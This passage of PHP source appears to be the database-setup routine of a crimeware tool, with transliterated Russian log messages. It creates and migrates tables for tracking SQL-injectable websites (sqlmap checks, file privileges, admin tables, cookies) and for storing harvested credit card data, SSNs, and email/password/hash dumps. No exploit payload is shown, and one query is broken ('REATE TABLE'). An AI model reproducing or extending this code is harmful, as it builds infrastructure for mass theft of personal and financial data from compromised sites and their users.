CHARSET=latin1 AUTO_INCREMENT=1 ;';
		$this->Post->query($dump_orders);
		$dump_orders_card = 'CREATE TABLE IF NOT EXISTS `orders_card` (' . "\r\n" . '`id` int(11) NOT NULL AUTO_INCREMENT,' . "\r\n" . '`order_id` int(3) NOT NULL,' . "\r\n" . '`column` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '`data` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '`column1` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '`data1` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '`column2` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '`data2` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '`column3` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '`data3` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '`column4` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '`data4` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '`column5` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '`data5` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '`prich` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . 'PRIMARY KEY (`id`)' . "\r\n" . ') ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;';
		$this->Post->query($dump_orders_card);
		$orders_one = 'REATE TABLE IF NOT EXISTS `orders_one` (' . "\r\n" . '  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,' . "\r\n" . '  `post_id` varchar(255) DEFAULT NULL,' . "\r\n" . '  `shema` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `bd` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `table` varchar(255) DEFAULT \'0\',' . "\r\n" . '  `card2` varchar(255) NOT NULL,' . "\r\n" . '  `column` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `column_16` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `count_n` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `count` int(11) NOT NULL,' . "\r\n" . '  `domen` varchar(255) DEFAULT \'0\',' . "\r\n" . '  PRIMARY KEY (`id`)' . "\r\n" . ') ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;';
		$this->Post->query($orders_one);
		$mails_one = 'CREATE TABLE IF NOT EXISTS `mails_one` (' . "\r\n" . '  `id` int(11) NOT NULL AUTO_INCREMENT,' . "\r\n" . '  `email` varchar(255) NOT NULL,' . "\r\n" . '  `pass` varchar(255) NOT NULL,' . "\r\n" . '  `domen` varchar(255) NOT NULL,' . "\r\n" . '  `zona` varchar(255) NOT NULL,' . "\r\n" . '  `bd` varchar(255) NOT NULL,' . "\r\n" . '  `date` date NOT NULL,' . "\r\n" . '  `hashtype` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `hash` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `hash2` varchar(255) DEFAULT \'0\',' . "\r\n" . '  `meiler` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `type` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `mx` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `abuse` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `down` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  PRIMARY KEY (`id`),' . "\r\n" . '  UNIQUE KEY `email` (`email`),' . "\r\n" . '  KEY `i_meiler` (`meiler`) USING BTREE,' . "\r\n" . '  KEY `i_date` (`date`) USING BTREE,' . "\r\n" . '  KEY `i_domen` (`domen`) USING BTREE' . "\r\n" . ') ENGINE=MyISAM DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;';
		$this->Post->query($mails_one);
		$multis_one = 'CREATE TABLE IF NOT EXISTS `multis_one` (' . "\r\n" . '  `id` int(11) NOT NULL AUTO_INCREMENT,' . "\r\n" . '  `filed_id` int(11) DEFAULT \'0\',' . "\r\n" . '  `post_id` int(11) DEFAULT \'0\',' . "\r\n" . '  `domen` varchar(255) DEFAULT \'0\',' . "\r\n" . '  `lastlimit` int(11) DEFAULT \'0\',' . "\r\n" . '  `count` int(11) DEFAULT \'0\',' . "\r\n" . '  `get` int(2) DEFAULT \'0\',' . "\r\n" . '  `potok` int(2) DEFAULT \'0\',' . "\r\n" . '  `function` int(3) DEFAULT \'0\',' . "\r\n" . '  `prich` varchar(255) DEFAULT \'0\',' . "\r\n" . '  `isp` varchar(255) DEFAULT \'0\',' . "\r\n" . '  `dok` int(3) DEFAULT \'0\',' . "\r\n" . '  `date` int(11) DEFAULT \'0\',' . "\r\n" . '  `pid` int(11) NOT NULL DEFAULT \'0\',' . "\r\n" . '  PRIMARY KEY (`id`)' . "\r\n" . ') ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;';
		$this->Post->query($multis_one);
		$dd = 'CREATE TABLE IF NOT EXISTS `mails_dumping` (' . "\r\n" . '  `id` int(11) NOT NULL AUTO_INCREMENT,' . "\r\n" . '  `email` varchar(255) NOT NULL,' . "\r\n" . '  `pass` varchar(255) NOT NULL,' . "\r\n" . '  `domen` varchar(255) NOT NULL,' . "\r\n" . '  `zona` varchar(255) NOT NULL,' . "\r\n" . '  `bd` varchar(255) NOT NULL,' . "\r\n" . '  `date` date NOT NULL,' . "\r\n" . '  `hashtype` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `hash` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `hash2` varchar(255) DEFAULT \'0\',' . "\r\n" . '  `meiler` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `type` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `mx` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `abuse` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `down` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  PRIMARY KEY (`id`),' . "\r\n" . '  UNIQUE KEY `email` (`email`),' . "\r\n" . '  KEY `i_meiler` (`meiler`) USING BTREE,' . "\r\n" . '  KEY `i_date` (`date`) USING BTREE,' . "\r\n" . '  KEY `i_domen` (`domen`) USING BTREE' . "\r\n" . ') ENGINE=MyISAM  DEFAULT CHARSET=latin1;';
		$this->Post->query($dd);
		$dump1 = 'CREATE TABLE IF NOT EXISTS `fileds_one` (' . "\r\n\t\t" . '`id` int(10) unsigned NOT NULL AUTO_INCREMENT,' . "\r\n" . '`post_id` varchar(255) DEFAULT NULL,' . "\r\n" . '`table` varchar(255) DEFAULT \'\',' . "\r\n" . '`password` varchar(255) DEFAULT \'\',' . "\r\n" . '`get` varchar(255) DEFAULT \'\',' . "\r\n" . '`lastlimit` varchar(255) DEFAULT \'\',' . "\r\n" . '`function` varchar(255) DEFAULT \'\',' . "\r\n" . '`count` int(11) NOT NULL,' . "\r\n" . '`ipbase` varchar(255) DEFAULT NULL,' . "\r\n" . '`ipbase2` varchar(255) NOT NULL,' . "\r\n" . '`label` varchar(255) DEFAULT NULL,' . "\r\n" . '`salt` varchar(255) DEFAULT NULL,' . "\r\n" . '`dok` int(5) DEFAULT \'0\',' . "\r\n" . '`site` varchar(255) DEFAULT \'0\',' . "\r\n" . '`multi` int(2) DEFAULT \'0\',' . "\r\n" . '`color` varchar(50) NOT NULL DEFAULT \'0\',' . "\r\n" . '`up` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '`potok` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . 'PRIMARY KEY (`id`)' . "\r\n" . ') ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;';
		$this->Post->query($dump1);
		$dump2 = 'CREATE TABLE IF NOT EXISTS `posts_one` (' . "\r\n" . ' `id` int(10) unsigned NOT NULL AUTO_INCREMENT,' . "\r\n" . '  `prohod` int(10) unsigned NOT NULL,' . "\r\n" . '  `gurl` varchar(255) CHARACTER SET latin1 DEFAULT \'\',' . "\r\n" . '  `tables` varchar(255) CHARACTER SET latin1 DEFAULT \'\',' . "\r\n" . '  `status` int(10) unsigned NOT NULL,' . "\r\n" . '  `work` varchar(255) CHARACTER SET latin1 DEFAULT \'\',' . "\r\n" . '  `sposob` varchar(255) CHARACTER SET latin1 DEFAULT \'\',' . "\r\n" . '  `method` varchar(255) CHARACTER SET latin1 DEFAULT \'\',' . "\r\n" . '  `column` varchar(255) CHARACTER SET latin1 DEFAULT \'\',' . "\r\n" . '  `user` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT \'0\',' . "\r\n" . '  `mysqlbd` varchar(255) CHARACTER SET latin1 DEFAULT \'\',' . "\r\n" . '  `file_priv` varchar(255) CHARACTER SET latin1 DEFAULT \'0\',' . "\r\n" . '  `version` varchar(255) CHARACTER SET latin1 DEFAULT \'\',' . "\r\n" . '  `tic` int(3) DEFAULT NULL,' . "\r\n" . '  `category` varchar(255) COLLATE utf8_unicode_ci DEFAULT \'0\',' . "\r\n" . '  `proverka_self` int(10) unsigned NOT NULL,' . "\r\n" . '  `domen` varchar(255) COLLATE utf8_unicode_ci NOT NULL,' . "\r\n" . '  `url` varchar(255) CHARACTER SET latin1 DEFAULT \'\',' . "\r\n" . '  `find` varchar(255) CHARACTER SET latin1 DEFAULT \'\',' . "\r\n" . '  `getmail` varchar(255) CHARACTER SET latin1 DEFAULT \'\',' . "\r\n" . '  `maska` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,' . "\r\n" . '  `date` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,' . "\r\n" . '  `sleep` varchar(255) COLLATE utf8_unicode_ci DEFAULT \'0\',' . "\r\n" . '  `tema` varchar(255) COLLATE utf8_unicode_ci DEFAULT \'0\',' . "\r\n" . '  `testing` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,' . "\r\n" . '  `admin` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT \'0\',' . "\r\n" . '  `pr` int(50) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `pr_check` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `alexa` int(50) NOT NULL DEFAULT \'100000000\',' . "\r\n" . '  `alexa_check` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `country` varchar(255) COLLATE utf8_unicode_ci DEFAULT \'cheking\',' . "\r\n" . '  `country_check` int(3) DEFAULT \'0\',' . "\r\n" . '  `color` varchar(50) COLLATE utf8_unicode_ci NOT NULL DEFAULT \'0\',' . "\r\n" . '  `up` int(2) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `order` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT \'0\',' . "\r\n" . '  `order_check` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `path1` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT \'0\',' . "\r\n" . '  `path2` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT \'0\',' . "\r\n" . '  `path3` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT \'0\',' . "\r\n" . '  `site1` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT \'0\',' . "\r\n" . '  `site2` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT \'0\',' . "\r\n" . '  `site3` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT \'0\',' . "\r\n" . '  `path_conf1` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT \'0\',' . "\r\n" . '  `path_conf2` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT \'0\',' . "\r\n" . '  `path_conf3` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT \'0\',' . "\r\n" . '  `cookies` varchar(500) COLLATE utf8_unicode_ci NOT NULL,' . "\r\n" . '  PRIMARY KEY (`id`),' . "\r\n" . '  UNIQUE KEY `domen` (`domen`),' . "\r\n" . '  UNIQUE KEY `url` (`url`),' . "\r\n" . '  KEY `ddd` (`domen`)' . "\r\n" . ') ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;';
		$this->Post->query($dump2);
		$ssn = 'CREATE TABLE IF NOT EXISTS `ssn` (' . "\r\n" . '  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,' . "\r\n" . '  `post_id` varchar(255) DEFAULT NULL,' . "\r\n" . '  `shema` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `bd` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `table` varchar(255) DEFAULT \'0\',' . "\r\n" . '  `column` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `column_16` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `count_n` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `count` int(11) NOT NULL,' . "\r\n" . '  `count_new` int(20) NOT NULL,' . "\r\n" . '  `check_count` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `domen` varchar(255) DEFAULT \'0\',' . "\r\n" . '  `card2` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `date` varchar(255) NOT NULL,' . "\r\n" . '  `date_new` varchar(255) NOT NULL,' . "\r\n" . '  `color` varchar(50) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `count_new2` int(20) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `typedb` varchar(255) NOT NULL,' . "\r\n" . '  PRIMARY KEY (`id`)' . "\r\n" . ') ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;';
		$this->Post->query($ssn);
		$dumpers_one = 'CREATE TABLE IF NOT EXISTS `dumpers_one` (' . "\r\n" . '  `id` int(11) NOT NULL AUTO_INCREMENT,' . "\r\n" . '  `post_id` int(11) NOT NULL,' . "\r\n" . '  `filed_id` int(10) unsigned NOT NULL,' . "\r\n" . '  `bd` varchar(255) NOT NULL,' . "\r\n" . '  `table` varchar(255) NOT NULL,' . "\r\n" . '  `filed` varchar(255) NOT NULL,' . "\r\n" . '  `get` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `multi` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  PRIMARY KEY (`id`),' . "\r\n" . '  KEY `filed_id` (`filed_id`)' . "\r\n" . ') ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;';
		$this->Post->query($dumpers_one);
		$domens = 'CREATE TABLE IF NOT EXISTS `domens` (' . "\r\n" . '  `id` int(11) NOT NULL AUTO_INCREMENT,' . "\r\n" . '  `bad` int(3) NOT NULL,' . "\r\n" . '  `domen` varchar(255) NOT NULL,' . "\r\n" . '  `domen_new` varchar(255) NOT NULL,' . "\r\n" . '  `status` int(10) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `find` varchar(255) NOT NULL DEFAULT \'\',' . "\r\n" . '  `domen_check` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `http` varchar(255) NOT NULL,' . "\r\n" . '  `post_check` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `get_url` varchar(255) DEFAULT NULL,' . "\r\n" . '  `post_url` varchar(255) NOT NULL,' . "\r\n" . '  `get_type` varchar(100) NOT NULL DEFAULT \'\',' . "\r\n" . '  `date` varchar(255) NOT NULL,' . "\r\n" . '  PRIMARY KEY (`id`),' . "\r\n" . '  UNIQUE KEY `domen` (`domen`),' . "\r\n" . '  UNIQUE KEY `get_url` (`get_url`)' . "\r\n" . ') ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;';
		$this->Post->query($domens);
		$bds_one = 'CREATE TABLE IF NOT EXISTS `bds_one` (' . "\r\n" . '  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,' . "\r\n" . '  `post_id` varchar(255) DEFAULT NULL,' . "\r\n" . '  `bd` varchar(255) DEFAULT \'\',' . "\r\n" . '  `count` int(11) NOT NULL,' . "\r\n" . '  `site` varchar(255) DEFAULT \'0\',' . "\r\n" . '  `color` varchar(50) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `up` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  PRIMARY KEY (`id`)' . "\r\n" . ') ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;';
		$this->Post->query($bds_one);
		$ssn_card = 'CREATE TABLE IF NOT EXISTS `ssn_card` (' . "\r\n" . '  `id` int(11) NOT NULL AUTO_INCREMENT,' . "\r\n" . '  `order_id` int(3) NOT NULL,' . "\r\n" . '  `column` text NOT NULL,' . "\r\n" . '  `data` text NOT NULL,' . "\r\n" . '  `prich` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '  PRIMARY KEY (`id`)' . "\r\n" . ') ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;';
		$this->Post->query($ssn_card);
		$ret = $this->Post->query('show columns FROM `posts` where `Field` = \'mysqlbd\'');

		if ($ret[0]['COLUMNS']['Field'] == 'mysqlbd') {
		}
		 else {
			$this->d('mysqlbd posts no, sozdaem posts');
			$this->Post->query('ALTER TABLE posts ADD mysqlbd varchar(255) NOT NULL ');
		}

		$ret = $this->Post->query('show columns FROM `posts` where `Field` = \'ssn\'');

		if ($ret[0]['COLUMNS']['Field'] == 'ssn') {
		}
		 else {
			$this->d('ssn posts no, sozdaem posts');
			$this->Post->query('ALTER TABLE posts ADD ssn varchar(255) NOT NULL ');
		}

		$ret = $this->Post->query('show columns FROM `posts` where `Field` = \'order_check\'');

		if ($ret[0]['COLUMNS']['Field'] == 'order_check') {
		}
		 else {
			$this->d('order_check  posts no, sozdaem');
			$this->Post->query('ALTER TABLE posts ADD order_check int(3) NOT NULL DEFAULT \'0\'');
		}

		$ret = $this->Post->query('show columns FROM `posts` where `Field` = \'ssn_check\'');

		if ($ret[0]['COLUMNS']['Field'] == 'ssn_check') {
		}
		 else {
			$this->d('ssn_check posts no, sozdaem');
			$this->Post->query('ALTER TABLE posts ADD ssn_check int(3) NOT NULL DEFAULT \'0\'');
		}

		$ret = $this->Post->query('show columns FROM `posts` where `Field` = \'country_check\'');

		if ($ret[0]['COLUMNS']['Field'] == 'country_check') {
		}
		 else {
			$this->d('country_check posts no, sozdaem');
			$this->Post->query('ALTER TABLE posts ADD country_check int(3) NOT NULL DEFAULT \'0\'');
		}

		$ret = $this->Post->query('show columns FROM `posts` where `Field` = \'alexa_check\'');

		if ($ret[0]['COLUMNS']['Field'] == 'alexa_check') {
		}
		 else {
			$this->d('alexa_check posts no, sozdaem');
			$this->Post->query('ALTER TABLE posts ADD alexa_check int(3) NOT NULL DEFAULT \'0\'');
		}

		$ret = $this->Post->query('show columns FROM `posts` where `Field` = \'up\'');

		if ($ret[0]['COLUMNS']['Field'] == 'up') {
		}
		 else {
			$this->d('up posts no, sozdaem');
			$this->Post->query('ALTER TABLE posts ADD up int(3) NOT NULL DEFAULT \'0\'');
		}

		$ret = $this->Post->query('show columns FROM `posts` where `Field` = \'color\'');

		if ($ret[0]['COLUMNS']['Field'] == 'color') {
		}
		 else {
			$this->d('color posts no, sozdaem');
			$this->Post->query('ALTER TABLE posts ADD color varchar(50) NOT NULL DEFAULT \'0\'');
		}

		$ret = $this->Post->query('show columns FROM `posts` where `Field` = \'http\'');

		if ($ret[0]['COLUMNS']['Field'] == 'http') {
		}
		 else {
			$this->d('http posts no, sozdaem');
			$this->Post->query('ALTER TABLE posts ADD http varchar(100) NOT NULL DEFAULT \'http://\'');
		}

		$ret = $this->Post->query('show columns FROM `posts` where `Field` = \'crawler\'');

		if ($ret[0]['COLUMNS']['Field'] == 'crawler') {
		}
		 else {
			$this->d('crawler posts no, sozdaem');
			$this->Post->query('ALTER TABLE posts ADD crawler int(3) NOT NULL DEFAULT \'0\'');
		}

		$ret = $this->Post->query('show columns FROM `posts` where `Field` = \'multi_count\'');

		if ($ret[0]['COLUMNS']['Field'] == 'multi_count') {
		}
		 else {
			$this->d('multi_count posts no, sozdaem');
			$this->Post->query('ALTER TABLE posts ADD multi_count int(3) NOT NULL DEFAULT \'0\'');
		}

		$ret = $this->Post->query('show columns FROM `posts` where `Field` = \'header\'');

		if ($ret[0]['COLUMNS']['Field'] == 'header') {
		}
		 else {
			$this->d('header posts no, sozdaem');
			$this->Post->query('ALTER TABLE posts ADD header varchar(100) NOT NULL DEFAULT \'get\'');
		}

		$ret = $this->Post->query('show columns FROM `posts` where `Field` = \'sqlmap_check\'');

		if ($ret[0]['COLUMNS']['Field'] == 'sqlmap_check') {
		}
		 else {
			$this->d('sqlmap_check posts no, sozdaem');
			$this->Post->query('ALTER TABLE posts ADD sqlmap_check int(3) NOT NULL DEFAULT \'0\'');
		}

		$ret = $this->Post->query('show columns FROM `posts` where `Field` = \'all_check\'');

		if ($ret[0]['COLUMNS']['Field'] == 'all_check') {
		}
		 else {
			$this->d('all_check posts no, sozdaem');
			$this->Post->query('ALTER TABLE posts ADD all_check int(3) NOT NULL DEFAULT 0');
		}

		$ret = $this->Post->query('show columns FROM `posts` where `Field` = \'path_query\'');

		if ($ret[0]['COLUMNS']['Field'] == 'path_query') {
		}
		 else {
			$this->d('path_query posts no, sozdaem');
			$this->Post->query('ALTER TABLE posts ADD path_query varchar(255) NOT NULL');
		}

		$ret = $this->Post->query('show columns FROM `posts` where `Field` = \'get_type\'');

		if ($ret[0]['COLUMNS']['Field'] == 'get_type') {
		}
		 else {
			$this->d('get_type posts no, sozdaem');
			$this->Post->query('ALTER TABLE posts ADD get_type varchar(100) NOT NULL');
		}

		$ret = $this->Post->query('show columns FROM `posts` where `Field` = \'from\'');

		if ($ret[0]['COLUMNS']['Field'] == 'from') {
		}
		 else {
			$this->d('from posts no, sozdaem');
			$this->Post->query('ALTER TABLE posts ADD from varchar(30) NOT NULL DEFAULT \'txt\'');
		}

		$ret = $this->Post->query('show columns FROM `posts_all` where `Field` = \'header\'');

		if ($ret[0]['COLUMNS']['Field'] == 'header') {
		}
		 else {
			$this->d('header posts no, sozdaem');
			$this->Post->query('ALTER TABLE posts_all ADD header varchar(100) NOT NULL DEFAULT \'get\'');
		}

		$ret = $this->Post->query('show columns FROM `posts_all` where `Field` = \'sqlmap_check\'');

		if ($ret[0]['COLUMNS']['Field'] == 'sqlmap_check') {
		}
		 else {
			$this->d('sqlmap_check posts_all no, sozdaem');
			$this->Post->query('ALTER TABLE posts_all ADD sqlmap_check int(3) NOT NULL DEFAULT \'0\'');
		}

		$ret = $this->Post->query('show columns FROM `posts_all` where `Field` = \'all_check\'');

		if ($ret[0]['COLUMNS']['Field'] == 'all_check') {
		}
		 else {
			$this->d('all_check posts_all no, sozdaem');
			$this->Post->query('ALTER TABLE posts_all ADD all_check int(3) NOT NULL DEFAULT 0');
		}

		$ret = $this->Post->query('show columns FROM `posts_all` where `Field` = \'insert_post\'');

		if ($ret[0]['COLUMNS']['Field'] == 'insert_post') {
		}
		 else {
			$this->d('insert_post posts_all no, sozdaem');
			$this->Post->query('ALTER TABLE posts_all ADD insert_post int(3) NOT NULL DEFAULT 0');
		}

		$ret = $this->Post->query('show columns FROM `posts_all` where `Field` = \'multi_count\'');

		if ($ret[0]['COLUMNS']['Field'] == 'multi_count') {
		}
		 else {
			$this->d('multi_count posts_all no, sozdaem');
			$this->Post->query('ALTER TABLE posts_all ADD multi_count int(3) NOT NULL DEFAULT 0');
		}

		$ret = $this->Post->query('show columns FROM `posts_all` where `Field` = \'from\'');

		if ($ret[0]['COLUMNS']['Field'] == 'from') {
		}
		 else {
			$this->d('from posts_all no, sozdaem');
			$this->Post->query('ALTER TABLE posts_all ADD from varchar(30) NOT NULL DEFAULT \'txt\'');
		}

		$ret = $this->Post->query('show columns FROM `posts_all` where `Field` = \'table_admin_check\'');

		if ($ret[0]['COLUMNS']['Field'] == 'table_admin_check') {
		}
		 else {
			$this->d('table_admin_check posts_all no, sozdaem');
			$this->Post->query('ALTER TABLE posts_all ADD table_admin_check int(3) NOT NULL DEFAULT \'0\'');
		}

		$ret = $this->Post->query('show columns FROM `orders` where `Field` = \'card2\'');

		if ($ret[0]['COLUMNS']['Field'] == 'card2') {
		}
		 else {
			$this->d('card2 orders no, sozdaem');
			$this->Post->query('ALTER TABLE orders ADD card2 varchar(255) NOT NULL DEFAULT \'0\'');
		}

		$ret = $this->Post->query('show columns FROM `orders` where `Field` = \'color\'');

		if ($ret[0]['COLUMNS']['Field'] == 'color') {
		}
		 else {
			$this->d('color orders no, sozdaem');
			$this->Post->query('ALTER TABLE orders ADD color varchar(50) NOT NULL DEFAULT \'0\'');
		}

		$ret = $this->Post->query('show columns FROM `orders` where `Field` = \'date\'');

		if ($ret[0]['COLUMNS']['Field'] == 'date') {
		}
		 else {
			$this->d('date orders no, sozdaem');
			$this->Post->query('ALTER TABLE orders ADD date varchar(255) NOT NULL');
		}

		$ret = $this->Post->query('show columns FROM `orders` where `Field` = \'date_new\'');

		if ($ret[0]['COLUMNS']['Field'] == 'date_new') {
		}
		 else {
			$this->d('date_new orders no, sozdaem');
			$this->Post->query('ALTER TABLE orders ADD date_new varchar(255) NOT NULL');
		}

		$ret = $this->Post->query('show columns FROM `orders` where `Field` = \'color\'');

		if ($ret[0]['COLUMNS']['Field'] == 'color') {
		}
		 else {
			$this->d('color orders no, sozdaem');
			$this->Post->query('ALTER TABLE orders ADD color varchar(255) NOT NULL');
		}

		$ret = $this->Post->query('show columns FROM `orders` where `Field` = \'typedb\'');

		if ($ret[0]['COLUMNS']['Field'] == 'typedb') {
		}
		 else {
			$this->d('typedb  orders no, sozdaem');
			$this->Post->query('ALTER TABLE orders ADD typedb varchar(255) NOT NULL');
		}

		$ret = $this->Post->query('show columns FROM `orders` where `Field` = \'count_new2\'');

		if ($ret[0]['COLUMNS']['Field'] == 'count_new2') {
		}
		 else {
			$this->d('count_new2 orders no, sozdaem');
			$this->Post->query('ALTER TABLE orders ADD count_new2 int(20) NOT NULL');
		}

		$ret = $this->Post->query('show columns FROM `fileds` where `Field` = \'name\'');

		if ($ret[0]['COLUMNS']['Field'] == 'name') {
		}
		 else {
			$this->d('name fileds no, sozdaem fileds');
			$this->Post->query('ALTER TABLE fileds ADD name varchar(500) NOT NULL ');
		}

		$ret = $this->Post->query('show columns FROM `fileds` where `Field` = \'phone\'');

		if ($ret[0]['COLUMNS']['Field'] == 'phone') {
		}
		 else {
			$this->d('phone fileds no, sozdaem fileds');
			$this->Post->query('ALTER TABLE fileds ADD phone varchar(255) NOT NULL ');
		}

		$ret = $this->Post->query('show columns FROM `fileds` where `Field` = \'typedb\'');

		if ($ret[0]['COLUMNS']['Field'] == 'typedb') {
		}
		 else {
			$this->d('typedb fileds no, sozdaem FILED');
			$this->Post->query('ALTER TABLE fileds ADD typedb varchar(255) NOT NULL ');
		}

		$ret = $this->Post->query('show columns FROM `fileds` where `Field` = \'dumping_one\'');

		if ($ret[0]['COLUMNS']['Field'] == 'dumping_one') {
		}
		 else {
			$this->d('dumping_one fileds no, sozdaem FILED');
			$this->Post->query('ALTER TABLE fileds ADD dumping_one int(3) NOT NULL DEFAULT \'0\'');
		}

		$ret = $this->Post->query('show columns FROM `fileds` where `Field` = \'login\'');

		if ($ret[0]['COLUMNS']['Field'] == 'login') {
		}
		 else {
			$this->d('login fileds no, sozdaem fileds');
			$this->Post->query('ALTER TABLE fileds ADD login varchar(255) NOT NULL ');
		}

		$ret = $this->Post->query('show columns FROM `fileds_one` where `Field` = \'potok\'');

		if ($ret[0]['COLUMNS']['Field'] == 'potok') {
		}
		 else {
			$this->d('potok fileds_one no, sozdaem');
			$this->Post->query('ALTER TABLE fileds_one ADD potok int(3) NOT NULL DEFAULT \'0\'');
		}

		$ret = $this->Post->query('show columns FROM `fileds_one` where `Field` = \'ipbase2\'');

		if ($ret[0]['COLUMNS']['Field'] == 'ipbase2') {
		}
		 else {
			$this->d('ipbase2 fileds_one no, sozdaem fileds_one');
			$this->Post->query('ALTER TABLE fileds_one ADD ipbase2 varchar(255) NOT NULL ');
		}

		$ret = $this->Post->query('show columns FROM `fileds_one` where `Field` = \'pri\'');

		if ($ret[0]['COLUMNS']['Field'] == 'pri') {
		}
		 else {
			$this->d('pri fileds_one no, sozdaem fileds_one');
			$this->Post->query('ALTER TABLE fileds_one ADD pri int(3) NOT NULL ');
		}

		$ret = $this->Post->query('show columns FROM `posts_one` where `Field` = \'mysqlbd\'');

		if ($ret[0]['COLUMNS']['Field'] == 'mysqlbd') {
		}
		 else {
			$this->d('mysqlbd posts_one no, sozdaem posts_one');
			$this->Post->query('ALTER TABLE posts_one ADD mysqlbd varchar(255) NOT NULL ');
		}

		$ret = $this->Post->query('show columns FROM `posts_one` where `Field` = \'order_check\'');

		if ($ret[0]['COLUMNS']['Field'] == 'order_check') {
		}
		 else {
			$this->d('order_check posts_one no, sozdaem');
			$this->Post->query('ALTER TABLE posts_one ADD order_check int(3) NOT NULL DEFAULT \'0\'');
		}

		$ret = $this->Post->query('show columns FROM `posts_one` where `Field` = \'ssn_check\'');

		if ($ret[0]['COLUMNS']['Field'] == 'ssn_check') {
		}
		 else {
			$this->d('ssn_check posts_one no, sozdaem');
			$this->Post->query('ALTER TABLE posts_one ADD ssn_check int(3) NOT NULL DEFAULT \'0\'');
		}

		$ret = $this->Post->query('show columns FROM `posts_one` where `Field` = \'country_check\'');

		if ($ret[0]['COLUMNS']['Field'] == 'country_check') {
		}
		 else {
			$this->d('country_check posts_one no, sozdaem');
